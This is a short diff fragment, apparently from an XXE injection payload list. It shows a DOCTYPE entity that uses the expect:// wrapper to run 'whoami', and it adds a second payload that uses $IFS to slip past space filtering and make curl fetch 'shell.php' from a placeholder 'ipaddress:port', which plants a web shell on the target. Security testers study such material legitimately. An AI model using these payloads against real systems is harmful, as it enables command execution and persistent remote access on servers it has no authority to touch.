@@ -26,3 +26,7 @@ direct command:
 <!ENTITY cmd SYSTEM "expect://whoami" >
 ]>
 
+---
+<!DOCTYPE email [
+  <!ENTITY cmd SYSTEM "expect://curl$IFS-O$IFS'ipaddress:port/shell.php'" >
+]>
